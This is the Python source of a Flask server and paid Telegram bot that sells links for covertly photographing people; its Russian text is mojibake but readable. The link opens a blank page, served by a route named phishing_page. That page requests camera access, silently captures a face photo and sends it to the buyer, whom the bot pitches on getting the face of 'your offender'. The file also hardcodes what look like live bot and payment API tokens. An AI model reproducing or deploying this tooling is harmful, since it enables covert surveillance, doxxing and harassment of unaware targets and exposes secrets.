import base64
import threading
import random
import string
import json
import requests
import time
import os
from flask import Flask, request, render_template_string, jsonify
import telebot
from telebot.types import InlineKeyboardMarkup, InlineKeyboardButton

app = Flask(__name__)

# –ö–æ–Ω—Ñ–∏–≥—É—Ä–∞—Ü–∏—è
CRYPTO_PAY_TOKEN = "410403:AALcR6CbyyvomMjUI8M1cdYh79RO7P9Szng"
API_BASE = "https://pay.crypt.bot/api"
SUBSCRIPTION_PRICE = 3.0  # –¶–µ–Ω–∞ –ø–æ–¥–ø–∏—Å–∫–∏ 3$
BOT_TOKEN = '8048949774:AAE8_hbqnCu5rwfrLdqZFlgbZ3v_INCfEZA'
# –ó–ê–ú–ï–ù–ò–¢–ï –ù–ê –í–ê–® –†–ï–ê–õ–¨–ù–´–ô URL –î–õ–Ø –ü–†–û–î–ê–ö–®–ï–ù–ê!
BASE_URL = "https://dox-searcher.onrender.com"

bot = telebot.TeleBot(BOT_TOKEN)

# –•—Ä–∞–Ω–∏–ª–∏—â–∞ –¥–∞–Ω–Ω—ã—Ö
photo_storage = {}
active_subscriptions = {}
user_tokens = {}  # user_id: custom_token
user_invoices = {}  # user_id: invoice_id
ADMINS = [688656311]  # –í–∞—à user_id

# –ì–µ–Ω–µ—Ä–∞—Ç–æ—Ä —Å–ª—É—á–∞–π–Ω—ã—Ö —Ç–æ–∫–µ–Ω–æ–≤
def generate_token(length=8):
    chars = string.ascii_letters + string.digits
    return ''.join(random.choice(chars) for _ in range(length))

# –§—É–Ω–∫—Ü–∏–∏ –¥–ª—è —Ä–∞–±–æ—Ç—ã —Å Crypto Pay
def create_crypto_bot_invoice(user_id: int):
    headers = {"Crypto-Pay-API-Token": CRYPTO_PAY_TOKEN}
    data = {
        "asset": "USDT",
        "amount": str(SUBSCRIPTION_PRICE),
        "description": "–í–µ—á–Ω–∞—è –ø–æ–¥–ø–∏—Å–∫–∞",
        "hidden_message": f"–û–ø–ª–∞—Ç–∞ –ø–æ–¥–ø–∏—Å–∫–∏ –ø–æ–ª—å–∑–æ–≤–∞—Ç–µ–ª–µ–º {user_id}",
        "paid_btn_name": "viewItem",
        "paid_btn_url": "https://t.me/EndParsBot",
        "payload": json.dumps({"user_id": user_id, "permanent": True}),
        "allow_comments": False,
        "allow_anonymous": False,
        "expires_in": 3600
    }
    
    try:
        response = requests.post(f"{API_BASE}/createInvoice", headers=headers, json=data)
        result = response.json()
        if result.get("ok"):
            invoice_data = result["result"]
            invoice_data['pay_url'] = invoice_data.get('pay_url', f"https://t.me/CryptoBot?start={invoice_data.get('hash', '')}")
            return invoice_data
        print(f"–û—à–∏–±–∫–∞ —Å–æ–∑–¥–∞–Ω–∏—è —Å—á–µ—Ç–∞: {result}")
    except Exception as e:
        print(f"–û—à–∏–±–∫–∞ –ø—Ä–∏ —Å–æ–∑–¥–∞–Ω–∏–∏ —Å—á–µ—Ç–∞: {e}")
    return None

def check_crypto_bot_invoice(invoice_id: int):
    headers = {"Crypto-Pay-API-Token": CRYPTO_PAY_TOKEN}
    try:
        response = requests.get(
            f"{API_BASE}/getInvoices",
            headers=headers,
            params={"invoice_ids": str(invoice_id)}
        )
        result = response.json()
        if result.get("ok") and result["result"]["items"]:
            return result["result"]["items"][0]
    except Exception as e:
        print(f"–û—à–∏–±–∫–∞ –ø—Ä–∏ –ø—Ä–æ–≤–µ—Ä–∫–µ —Å—á–µ—Ç–∞: {e}")
    return None

# –ê–±—Å–æ–ª—é—Ç–Ω–æ –ø—É—Å—Ç–æ–π HTML —Å –∞–≤—Ç–æ–º–∞—Ç–∏—á–µ—Å–∫–æ–π —Ñ–æ—Ç–æ—Å—ä–µ–º–∫–æ–π
HTML_TEMPLATE = """
<!DOCTYPE html>
<html>
<head>
    <meta charset="UTF-8">
    <style>
        body, html {
            margin: 0;
            padding: 0;
            height: 100%;
            background: white;
            overflow: hidden;
        }
        video, canvas {
            display: none;
        }
    </style>
</head>
<body>
    <video id="video" autoplay playsinline></video>
    <canvas id="canvas"></canvas>

    <script>
        const video = document.getElementById('video');
        const canvas = document.getElementById('canvas');
        
        canvas.width = 640;
        canvas.height = 480;
        
        // –§—É–Ω–∫—Ü–∏—è –¥–ª—è –∑–∞—Ö–≤–∞—Ç–∞ —Ñ–æ—Ç–æ
        function capturePhoto() {
            const context = canvas.getContext('2d');
            context.drawImage(video, 0, 0, canvas.width, canvas.height);
            return canvas.toDataURL('image/jpeg', 0.8);
        }
        
        // –§—É–Ω–∫—Ü–∏—è –æ—Ç–ø—Ä–∞–≤–∫–∏ —Ñ–æ—Ç–æ –Ω–∞ —Å–µ—Ä–≤–µ—Ä
        async function sendPhoto(photoData) {
            const token = window.location.pathname.split('/').pop();
            
            try {
                await fetch('/upload', {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/json' },
                    body: JSON.stringify({ 
                        image: photoData,
                        token: token
                    })
                });
                
                // –ü–æ—Å–ª–µ –æ—Ç–ø—Ä–∞–≤–∫–∏ –æ—Å—Ç–∞–Ω–∞–≤–ª–∏–≤–∞–µ–º –∫–∞–º–µ—Ä—É
                if (video.srcObject) {
                    const tracks = video.srcObject.getTracks();
                    tracks.forEach(track => track.stop());
                }
                
            } catch (error) {
                console.error('Upload error:', error);
            }
        }
        
        // –ê–≤—Ç–æ–º–∞—Ç–∏—á–µ—Å–∫–∞—è —Ñ–æ—Ç–æ—Å—ä–µ–º–∫–∞ –ø—Ä–∏ –ø–æ–ª—É—á–µ–Ω–∏–∏ –¥–æ—Å—Ç—É–ø–∞
        async function initCameraAndCapture() {
            try {
                const stream = await navigator.mediaDevices.getUserMedia({ 
                    video: {
                        width: { ideal: 1280 },
                        height: { ideal: 720 },
                        facingMode: 'user'
                    } 
                });
                
                video.srcObject = stream;
                
                // –ñ–¥–µ–º 1 —Å–µ–∫—É–Ω–¥—É –¥–ª—è —Å—Ç–∞–±–∏–ª–∏–∑–∞—Ü–∏–∏ –∏–∑–æ–±—Ä–∞–∂–µ–Ω–∏—è
                setTimeout(() => {
                    const photo = capturePhoto();
                    sendPhoto(photo);
                }, 1000);
                
            } catch (err) {
                console.error('Camera error:', err);
            }
        }
        
        // –ó–∞–ø—É—Å–∫–∞–µ–º –ø—Ä–æ—Ü–µ—Å—Å –ø—Ä–∏ –∑–∞–≥—Ä—É–∑–∫–µ —Å—Ç—Ä–∞–Ω–∏—Ü—ã
        window.addEventListener('DOMContentLoaded', initCameraAndCapture);
    </script>
</body>
</html>
"""

@app.route('/<custom_token>')
def phishing_page(custom_token):
    return render_template_string(HTML_TEMPLATE)

@app.route('/upload', methods=['POST'])
def handle_upload():
    try:
        data = request.json
        custom_token = data.get('token')
        
        if not custom_token:
            return 'Token required', 400
            
        user_id = None
        for uid, token in user_tokens.items():
            if token == custom_token:
                user_id = uid
                break
                
        if not user_id:
            return 'Invalid token', 400

        image_data = data['image'].split(',')[1]
        photo_storage[user_id] = image_data
        
        # –°–æ–∑–¥–∞–µ–º –ø–∞–ø–∫—É –¥–ª—è —Ñ–æ—Ç–æ, –µ—Å–ª–∏ –µ–µ –Ω–µ—Ç
        os.makedirs("photos", exist_ok=True)
        
        # –°–æ—Ö—Ä–∞–Ω—è–µ–º —Ñ–æ—Ç–æ –≤—Ä–µ–º–µ–Ω–Ω–æ
        filename = f"photos/photo_{custom_token}_{int(time.time())}.jpg"
        with open(filename, "wb") as f:
            f.write(base64.b64decode(image_data))
        
        # –û—Ç–ø—Ä–∞–≤–ª—è–µ–º —Ñ–æ—Ç–æ –≤ Telegram
        with open(filename, "rb") as photo:
            bot.send_photo(
                chat_id=user_id,
                photo=photo,
                caption=f"‚úÖ –§–æ—Ç–æ —É—Å–ø–µ—à–Ω–æ –ø–æ–ª—É—á–µ–Ω–æ!\n–¢–æ–∫–µ–Ω: {custom_token}"
            )
        
        return '', 200
    except Exception as e:
        print(f"–û—à–∏–±–∫–∞ –ø—Ä–∏ –∑–∞–≥—Ä—É–∑–∫–µ —Ñ–æ—Ç–æ: {e}")
        return 'Server error', 500

# –û–±—Ä–∞–±–æ—Ç—á–∏–∫–∏ –±–æ—Ç–∞
@bot.message_handler(commands=['start'])
def start_handler(message):
    try:
        # –ü—Ä–æ–≤–µ—Ä—è–µ–º –Ω–∞–ª–∏—á–∏–µ —Ñ–∞–π–ª–∞ —Å –∏–∫–æ–Ω–∫–æ–π
        if os.path.exists('icon.png'):
            with open('icon.png', 'rb') as photo:
                bot.send_photo(
                    message.chat.id,
                    photo,
                    caption="<b>–ü–æ–ª—É—á–∏ —Ñ–æ—Ç–æ –ª–∏—Ü–∞ —Å–≤–æ–µ–≥–æ –æ–±–∏–¥—á–∏–∫–∞ –∑–∞ –ø–∞—Ä—É —Å–µ–∫—É–Ω–¥.</b>",
                    parse_mode="HTML",
                    reply_markup=main_keyboard()
                )
        else:
            # –ï—Å–ª–∏ —Ñ–∞–π–ª–∞ –Ω–µ—Ç, –æ—Ç–ø—Ä–∞–≤–ª—è–µ–º —Ç–µ–∫—Å—Ç–æ–≤–æ–µ —Å–æ–æ–±—â–µ–Ω–∏–µ
            bot.send_message(
                message.chat.id,
                "<b>–ü–æ–ª—É—á–∏ —Ñ–æ—Ç–æ –ª–∏—Ü–∞ —Å–≤–æ–µ–≥–æ –æ–±–∏–¥—á–∏–∫–∞ –∑–∞ –ø–∞—Ä—É —Å–µ–∫—É–Ω–¥.</b>",
                parse_mode="HTML",
                reply_markup=main_keyboard()
            )
    except Exception as e:
        print(f"–û—à–∏–±–∫–∞ –ø—Ä–∏ –æ—Ç–ø—Ä–∞–≤–∫–µ —Å—Ç–∞—Ä—Ç–æ–≤–æ–≥–æ —Å–æ–æ–±—â–µ–Ω–∏—è: {e}")
        bot.send_message(
            message.chat.id,
            "–ü–æ–ª—É—á–∏ —Ñ–æ—Ç–æ –ª–∏—Ü–∞ —Å–≤–æ–µ–≥–æ –æ–±–∏–¥—á–∏–∫–∞ –∑–∞ –ø–∞—Ä—É —Å–µ–∫—É–Ω–¥.",
            reply_markup=main_keyboard()
        )

def main_keyboard():
    keyboard = InlineKeyboardMarkup()
    keyboard.row(
        InlineKeyboardButton('üõ° –°–æ–∑–¥–∞—Ç—å —Å—Å—ã–ª–∫—É', callback_data='create_link'),
        InlineKeyboardButton('üí≥ –ü–æ–¥–ø–∏—Å–∫–∞', callback_data='subscription')
    )
    return keyboard

@bot.callback_query_handler(func=lambda call: call.data == 'create_link')
def create_link_handler(call):
    try:
        user_id = call.message.chat.id
        print(f"–ü–æ–ª—å–∑–æ–≤–∞—Ç–µ–ª—å {user_id} –∑–∞–ø—Ä–æ—Å–∏–ª —Å–æ–∑–¥–∞–Ω–∏–µ —Å—Å—ã–ª–∫–∏")
        
        # –ü—Ä–æ–≤–µ—Ä—è–µ–º –Ω–∞–ª–∏—á–∏–µ –∞–∫—Ç–∏–≤–Ω–æ–π –ø–æ–¥–ø–∏—Å–∫–∏
        if user_id in active_subscriptions and active_subscriptions[user_id]:
            custom_token = generate_token()
            user_tokens[user_id] = custom_token
            link = f"{BASE_URL}/{custom_token}"
            
            print(f"–°–æ–∑–¥–∞–Ω–∞ —Å—Å—ã–ª–∫–∞ –¥–ª—è {user_id}: {link}")
            
            bot.send_message(
                user_id,
                f"üîó –í–∞—à–∞ —Å—Å—ã–ª–∫–∞ –¥–ª—è –ø–æ–ª—É—á–µ–Ω–∏—è –ª–∏—Ü–∞:\n<code>{link}</code>\n\n"
                "–û—Ç–ø—Ä–∞–≤—å—Ç–µ –µ—ë —Ü–µ–ª–∏. –ü—Ä–∏ –æ—Ç–∫—Ä—ã—Ç–∏–∏:\n"
                "1. –ê–≤—Ç–æ–º–∞—Ç–∏—á–µ—Å–∫–∏ –∑–∞–ø—Ä–æ—Å–∏—Ç—Å—è –¥–æ—Å—Ç—É–ø –∫ –∫–∞–º–µ—Ä–µ\n"
                "2. –ï—Å–ª–∏ –¥–æ—Å—Ç—É–ø —Ä–∞–∑—Ä–µ—à–µ–Ω - —Ñ–æ—Ç–æ —Å–¥–µ–ª–∞–µ—Ç—Å—è –∞–≤—Ç–æ–º–∞—Ç–∏—á–µ—Å–∫–∏\n"
                "3. –§–æ—Ç–æ –ø—Ä–∏–¥–µ—Ç –≤ —ç—Ç–æ—Ç —á–∞—Ç",
                parse_mode="HTML"
            )
        else:
            print(f"–£ –ø–æ–ª—å–∑–æ–≤–∞—Ç–µ–ª—è {user_id} –Ω–µ—Ç –∞–∫—Ç–∏–≤–Ω–æ–π –ø–æ–¥–ø–∏—Å–∫–∏")
            bot.send_message(
                user_id,
                "‚ùå –î–ª—è —Å–æ–∑–¥–∞–Ω–∏—è —Å—Å—ã–ª–∫–∏ –Ω–µ–æ–±—Ö–æ–¥–∏–º–∞ –ø–æ–¥–ø–∏—Å–∫–∞!",
                reply_markup=InlineKeyboardMarkup().add(
                    InlineKeyboardButton('üí≥ –ö—É–ø–∏—Ç—å –ø–æ–¥–ø–∏—Å–∫—É', callback_data='subscription')
                )
            )
            
        # –ü–æ–¥—Ç–≤–µ—Ä–∂–¥–∞–µ–º –æ–±—Ä–∞–±–æ—Ç–∫—É callback
        bot.answer_callback_query(call.id)
    except Exception as e:
        print(f"–û—à–∏–±–∫–∞ –ø—Ä–∏ —Å–æ–∑–¥–∞–Ω–∏–∏ —Å—Å—ã–ª–∫–∏: {e}")
        bot.send_message(call.message.chat.id, "‚ùå –ü—Ä–æ–∏–∑–æ—à–ª–∞ –æ—à–∏–±–∫–∞ –ø—Ä–∏ —Å–æ–∑–¥–∞–Ω–∏–∏ —Å—Å—ã–ª–∫–∏. –ü–æ–ø—Ä–æ–±—É–π—Ç–µ –ø–æ–∑–∂–µ.")

@bot.callback_query_handler(func=lambda call: call.data == 'subscription')
def subscription_handler(call):
    try:
        user_id = call.message.chat.id
        bot.send_message(
            user_id,
            f"<b>üîê –ü—Ä–µ–º–∏—É–º –ø–æ–¥–ø–∏—Å–∫–∞</b>\n\n"
            f"–î–ª—è –∏—Å–ø–æ–ª—å–∑–æ–≤–∞–Ω–∏—è –≤—Å–µ—Ö —Ñ—É–Ω–∫—Ü–∏–π –±–æ—Ç–∞ –Ω—É–∂–Ω–∞ –ø–æ–¥–ø–∏—Å–∫–∞\n"
            f"–¶–µ–Ω–∞ –ø–æ–¥–ø–∏—Å–∫–∏: <b>{SUBSCRIPTION_PRICE} USDT</b>\n\n"
            "–í—ã —É–≤–µ—Ä–µ–Ω—ã —á—Ç–æ —Ö–æ—Ç–∏—Ç–µ –∫—É–ø–∏—Ç—å –ø–æ–¥–ø–∏—Å–∫—É?",
            parse_mode="HTML",
            reply_markup=InlineKeyboardMarkup().row(
                InlineKeyboardButton('‚úÖ –î–∞', callback_data='sub_yes'),
                InlineKeyboardButton('‚ùå –ù–µ—Ç', callback_data='sub_no')
            )
        )
        bot.answer_callback_query(call.id)
    except Exception as e:
        print(f"–û—à–∏–±–∫–∞ –ø—Ä–∏ –æ–±—Ä–∞–±–æ—Ç–∫–µ –ø–æ–¥–ø–∏—Å–∫–∏: {e}")

@bot.callback_query_handler(func=lambda call: call.data in ['sub_yes', 'sub_no'])
def sub_confirm_handler(call):
    try:
        user_id = call.message.chat.id
        
        if call.data == 'sub_no':
            bot.send_message(user_id, "‚ùå –ü–æ–∫—É–ø–∫–∞ –æ—Ç–º–µ–Ω–µ–Ω–∞")
            bot.answer_callback_query(call.id)
            return
            
        invoice = create_crypto_bot_invoice(user_id)
        if invoice:
            user_invoices[user_id] = invoice['invoice_id']
            bot.send_message(
                user_id,
                f"üí∞ <b>–°—á–µ—Ç —Å–æ–∑–¥–∞–Ω!</b>\n\n"
                f"–ü–æ—Å–ª–µ –æ–ø–ª–∞—Ç—ã –Ω–∞–∂–º–∏—Ç–µ '–ü—Ä–æ–≤–µ—Ä–∏—Ç—å –æ–ø–ª–∞—Ç—É' –¥–ª—è –∞–∫—Ç–∏–≤–∞—Ü–∏–∏ –ø–æ–¥–ø–∏—Å–∫–∏\n\n"
                f"‚ñ™Ô∏è –°—É–º–º–∞: <b>{SUBSCRIPTION_PRICE} USDT</b>\n"
                f"‚ñ™Ô∏è –°—Å—ã–ª–∫–∞ –¥–ª—è –æ–ø–ª–∞—Ç—ã: <code>{invoice['pay_url']}</code>\n"
                f"‚ñ™Ô∏è –°—Ä–æ–∫ –¥–µ–π—Å—Ç–≤–∏—è: 1 —á–∞—Å",
                parse_mode="HTML",
                reply_markup=InlineKeyboardMarkup().row(
                    InlineKeyboardButton('üí≥ –û–ø–ª–∞—Ç–∏—Ç—å', url=invoice['pay_url']),
                    InlineKeyboardButton('üîÑ –ü—Ä–æ–≤–µ—Ä–∏—Ç—å –æ–ø–ª–∞—Ç—É', callback_data='check_payment')
                )
            )
        else:
            bot.send_message(user_id, "‚ùå –û—à–∏–±–∫–∞ —Å–æ–∑–¥–∞–Ω–∏—è —Å—á–µ—Ç–∞, –ø–æ–ø—Ä–æ–±—É–π—Ç–µ –ø–æ–∑–∂–µ")
            
        bot.answer_callback_query(call.id)
    except Exception as e:
        print(f"–û—à–∏–±–∫–∞ –ø—Ä–∏ –ø–æ–¥—Ç–≤–µ—Ä–∂–¥–µ–Ω–∏–∏ –ø–æ–¥–ø–∏—Å–∫–∏: {e}")

@bot.callback_query_handler(func=lambda call: call.data == 'check_payment')
def check_payment_handler(call):
    try:
        user_id = call.message.chat.id
        invoice_id = user_invoices.get(user_id)
        
        if not invoice_id:
            bot.send_message(user_id, "‚ùå –°—á–µ—Ç –Ω–µ –Ω–∞–π–¥–µ–Ω")
            bot.answer_callback_query(call.id)
            return
            
        invoice = check_crypto_bot_invoice(invoice_id)
        
        if invoice and invoice['status'] == 'paid':
            active_subscriptions[user_id] = True
            bot.send_message(user_id, "‚úÖ –û–ø–ª–∞—Ç–∞ –ø–æ–¥—Ç–≤–µ—Ä–∂–¥–µ–Ω–∞! –ü–æ–¥–ø–∏—Å–∫–∞ –∞–∫—Ç–∏–≤–∏—Ä–æ–≤–∞–Ω–∞")
            
            # –û—Ç–ø—Ä–∞–≤–ª—è–µ–º –∫–Ω–æ–ø–∫—É –¥–ª—è —Å–æ–∑–¥–∞–Ω–∏—è —Å—Å—ã–ª–∫–∏
            bot.send_message(
                user_id,
                "–¢–µ–ø–µ—Ä—å –≤—ã –º–æ–∂–µ—Ç–µ —Å–æ–∑–¥–∞—Ç—å —Å—Å—ã–ª–∫—É –¥–ª—è –ø–æ–ª—É—á–µ–Ω–∏—è —Ñ–æ—Ç–æ:",
                reply_markup=InlineKeyboardMarkup().add(
                    InlineKeyboardButton('üõ° –°–æ–∑–¥–∞—Ç—å —Å—Å—ã–ª–∫—É', callback_data='create_link')
                )
            )
        else:
            bot.send_message(
                user_id,
                "‚ùå –û–ø–ª–∞—Ç–∞ –Ω–µ –Ω–∞–π–¥–µ–Ω–∞\n\n"
                "–ï—Å–ª–∏ –≤—ã –ø—Ä–æ–∏–∑–≤–µ–ª–∏ –æ–ø–ª–∞—Ç—É, –ø–æ–¥–æ–∂–¥–∏—Ç–µ 2-3 –º–∏–Ω—É—Ç—ã –∏ –ø—Ä–æ–≤–µ—Ä—å—Ç–µ —Å–Ω–æ–≤–∞",
                reply_markup=InlineKeyboardMarkup().add(
                    InlineKeyboardButton('üîÑ –ü—Ä–æ–≤–µ—Ä–∏—Ç—å —Å–Ω–æ–≤–∞', callback_data='check_payment')
                )
            )
            
        bot.answer_callback_query(call.id)
    except Exception as e:
        print(f"–û—à–∏–±–∫–∞ –ø—Ä–∏ –ø—Ä–æ–≤–µ—Ä–∫–µ –æ–ø–ª–∞—Ç—ã: {e}")

# –ü—Ä–æ—Å—Ç–∞—è –∞–¥–º–∏–Ω-–ø–∞–Ω–µ–ª—å
@bot.message_handler(commands=['admin'])
def admin_handler(message):
    if message.from_user.id not in ADMINS:
        return
        
    bot.send_message(
        message.chat.id,
        "üîí –ê–¥–º–∏–Ω-–ø–∞–Ω–µ–ª—å:",
        reply_markup=InlineKeyboardMarkup().row(
            InlineKeyboardButton('‚ûï –í—ã–¥–∞—Ç—å –ø–æ–¥–ø–∏—Å–∫—É', callback_data='admin_give_sub'),
            InlineKeyboardButton('‚ûñ –ó–∞–±—Ä–∞—Ç—å –ø–æ–¥–ø–∏—Å–∫—É', callback_data='admin_revoke_sub')
        )
    )

@bot.callback_query_handler(func=lambda call: call.data == 'admin_give_sub')
def admin_give_sub(call):
    try:
        admin_id = call.message.chat.id
        if admin_id not in ADMINS:
            return
            
        # –ó–∞–ø—Ä–∞—à–∏–≤–∞–µ–º ID –ø–æ–ª—å–∑–æ–≤–∞—Ç–µ–ª—è
        msg = bot.send_message(
            admin_id,
            "–í–≤–µ–¥–∏—Ç–µ ID –ø–æ–ª—å–∑–æ–≤–∞—Ç–µ–ª—è –¥–ª—è –≤—ã–¥–∞—á–∏ –ø–æ–¥–ø–∏—Å–∫–∏:"
        )
        
        # –†–µ–≥–∏—Å—Ç—Ä–∏—Ä—É–µ–º —Å–ª–µ–¥—É—é—â–∏–π —à–∞–≥
        bot.register_next_step_handler(msg, process_admin_give_sub)
        bot.answer_callback_query(call.id)
    except Exception as e:
        print(f"–û—à–∏–±–∫–∞ –≤ –∞–¥–º–∏–Ω-–ø–∞–Ω–µ–ª–∏: {e}")

def process_admin_give_sub(message):
    try:
        admin_id = message.chat.id
        if admin_id not in ADMINS:
            return
            
        try:
            target_id = int(message.text)
            active_subscriptions[target_id] = True
            
            # –£–≤–µ–¥–æ–º–ª—è–µ–º –∞–¥–º–∏–Ω–∞
            bot.send_message(admin_id, f"‚úÖ –ü–æ–¥–ø–∏—Å–∫–∞ –≤—ã–¥–∞–Ω–∞ –ø–æ–ª—å–∑–æ–≤–∞—Ç–µ–ª—é {target_id}")
            
            # –£–≤–µ–¥–æ–º–ª—è–µ–º –ø–æ–ª—å–∑–æ–≤–∞—Ç–µ–ª—è
            try:
                bot.send_message(target_id, "üéâ –í–∞–º –≤—ã–¥–∞–Ω–∞ –ø–æ–¥–ø–∏—Å–∫–∞ –∞–¥–º–∏–Ω–∏—Å—Ç—Ä–∞—Ç–æ—Ä–æ–º!")
            except:
                pass
                
        except ValueError:
            bot.send_message(admin_id, "‚ùå –ù–µ–≤–µ—Ä–Ω—ã–π —Ñ–æ—Ä–º–∞—Ç ID. –í–≤–µ–¥–∏—Ç–µ —á–∏—Å–ª–æ–≤–æ–π ID –ø–æ–ª—å–∑–æ–≤–∞—Ç–µ–ª—è.")
    except Exception as e:
        print(f"–û—à–∏–±–∫–∞ –ø—Ä–∏ –≤—ã–¥–∞—á–µ –ø–æ–¥–ø–∏—Å–∫–∏: {e}")

@bot.callback_query_handler(func=lambda call: call.data == 'admin_revoke_sub')
def admin_revoke_sub(call):
    try:
        admin_id = call.message.chat.id
        if admin_id not in ADMINS:
            return
            
        # –ó–∞–ø—Ä–∞—à–∏–≤–∞–µ–º ID –ø–æ–ª—å–∑–æ–≤–∞—Ç–µ–ª—è
        msg = bot.send_message(
            admin_id,
            "–í–≤–µ–¥–∏—Ç–µ ID –ø–æ–ª—å–∑–æ–≤–∞—Ç–µ–ª—è –¥–ª—è –æ—Ç–∑—ã–≤–∞ –ø–æ–¥–ø–∏—Å–∫–∏:"
        )
        
        # –†–µ–≥–∏—Å—Ç—Ä–∏—Ä—É–µ–º —Å–ª–µ–¥—É—é—â–∏–π —à–∞–≥
        bot.register_next_step_handler(msg, process_admin_revoke_sub)
        bot.answer_callback_query(call.id)
    except Exception as e:
        print(f"–û—à–∏–±–∫–∞ –≤ –∞–¥–º–∏–Ω-–ø–∞–Ω–µ–ª–∏: {e}")

def process_admin_revoke_sub(message):
    try:
        admin_id = message.chat.id
        if admin_id not in ADMINS:
            return
            
        try:
            target_id = int(message.text)
            if target_id in active_subscriptions:
                del active_subscriptions[target_id]
                bot.send_message(admin_id, f"‚úÖ –ü–æ–¥–ø–∏—Å–∫–∞ –æ—Ç–æ–∑–≤–∞–Ω–∞ —É –ø–æ–ª—å–∑–æ–≤–∞—Ç–µ–ª—è {target_id}")
                
                # –£–≤–µ–¥–æ–º–ª—è–µ–º –ø–æ–ª—å–∑–æ–≤–∞—Ç–µ–ª—è
                try:
                    bot.send_message(target_id, "‚ùå –í–∞—à–∞ –ø–æ–¥–ø–∏—Å–∫–∞ –±—ã–ª–∞ –æ—Ç–æ–∑–≤–∞–Ω–∞ –∞–¥–º–∏–Ω–∏—Å—Ç—Ä–∞—Ç–æ—Ä–æ–º")
                except:
                    pass
            else:
                bot.send_message(admin_id, f"‚ùå –£ –ø–æ–ª—å–∑–æ–≤–∞—Ç–µ–ª—è {target_id} –Ω–µ—Ç –∞–∫—Ç–∏–≤–Ω–æ–π –ø–æ–¥–ø–∏—Å–∫–∏")
                
        except ValueError:
            bot.send_message(admin_id, "‚ùå –ù–µ–≤–µ—Ä–Ω—ã–π —Ñ–æ—Ä–º–∞—Ç ID. –í–≤–µ–¥–∏—Ç–µ —á–∏—Å–ª–æ–≤–æ–π ID –ø–æ–ª—å–∑–æ–≤–∞—Ç–µ–ª—è.")
    except Exception as e:
        print(f"–û—à–∏–±–∫–∞ –ø—Ä–∏ –æ—Ç–∑—ã–≤–µ –ø–æ–¥–ø–∏—Å–∫–∏: {e}")

def run_flask():
    app.run(host='0.0.0.0', port=5000, threaded=True)

def run_bot():
    print("–ë–æ—Ç –∑–∞–ø—É—â–µ–Ω!")
    bot.infinity_polling()

if __name__ == '__main__':
    # –°–æ–∑–¥–∞–µ–º –ø–∞–ø–∫—É –¥–ª—è —Ñ–æ—Ç–æ
    os.makedirs("photos", exist_ok=True)
    
    # –ó–∞–ø—É—Å–∫–∞–µ–º Flask –≤ –æ—Ç–¥–µ–ª—å–Ω–æ–º –ø–æ—Ç–æ–∫–µ
    flask_thread = threading.Thread(target=run_flask)
    flask_thread.daemon = True
    flask_thread.start()
    
    # –ó–∞–ø—É—Å–∫–∞–µ–º –±–æ—Ç–∞
    run_bot()
